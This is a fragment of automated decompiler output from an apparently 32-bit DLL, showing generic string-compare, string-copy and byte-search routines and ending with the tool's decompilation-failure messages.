int __cdecl sub_1000859C(int a1, int a2)
{
  int v2; // edx@1
  int v3; // esi@1
  char v4; // al@2
  char v5; // al@5
  char v6; // cl@5

  v2 = a1;
  v3 = a2;
  do
  {
    v4 = *(_BYTE *)v2;
    if ( *(_BYTE *)v2 >= 65 )
    {
      if ( v4 <= 90 )
        v4 += 32;
    }
    v6 = v4;
    v5 = *(_BYTE *)v3;
    if ( *(_BYTE *)v3 >= 65 )
    {
      if ( v5 <= 90 )
        v5 += 32;
    }
    ++v2;
    ++v3;
  }
  while ( v6 && v6 == v5 );
  return v6 - v5;
}

//----- (100085F5) --------------------------------------------------------
int __cdecl sub_100085F5(int a1, int a2)
{
  int v2; // edx@1
  int v3; // ecx@1
  char v4; // al@2

  v3 = a1;
  v2 = a2;
  do
  {
    v4 = *(_BYTE *)v2;
    *(_BYTE *)v3++ = *(_BYTE *)v2++;
  }
  while ( v4 );
  return a1;
}

//----- (1000860C) --------------------------------------------------------
int __stdcall sub_1000860C(int a1, int a2, int a3, unsigned int a4)
{
  signed int i; // ecx@1
  unsigned int v5; // esi@1
  int v6; // edi@2
  int result; // eax@10
  int v8; // [sp+1Ch] [bp+10h]@3

  v5 = 0;
  i = 0;
  if ( a1 && (v6 = a3, a3) && (v8 = a2 - a4, a2 != a4) )
  {
    while ( 1 )
    {
      if ( *(_BYTE *)(v5 + a1) == *(_BYTE *)v6 )
      {
        for ( i = 1; i < a4; ++i )
        {
          if ( *(_BYTE *)(i + v5 + a1) != *(_BYTE *)(v6 + i) )
            break;
        }
      }
      if ( a4 == i )
        break;
      ++v5;
      if ( v5 >= v8 )
        goto LABEL_10;
    }
    result = v5 + a1;
  }
  else
  {
LABEL_10:
    result = 0;
  }
  return result;
}

//----- (10009DF4) --------------------------------------------------------
__int16 *__cdecl sub_10009DF4()
{
  char v1; // [sp+1Ch] [bp-428h]@1
  __int16 v2; // [sp+42Ch] [bp-18h]@1
  int v3; // [sp+42Eh] [bp-16h]@1
  __int16 v4; // [sp+432h] [bp-12h]@1
  __int16 v5; // [sp+434h] [bp-10h]@1
  int v6; // [sp+436h] [bp-Eh]@1
  __int16 v7; // [sp+43Ah] [bp-Ah]@1
  __int16 v8; // [sp+43Ch] [bp-8h]@1
  int v9; // [sp+43Eh] [bp-6h]@1
  __int16 v10; // [sp+442h] [bp-2h]@1

  v8 = 0;
  v9 = 0;
  v10 = 0;
  v2 = 0;
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  v7 = 0;
  sub_10008469(0, &v1, 32, 0x410u);
  return &v8;
}

//----- (1000A064) --------------------------------------------------------
#error "1000A095: positive sp value has been found (funcsize=36)"

#error "There were 6 decompilation failure(s) on 86 function(s)"
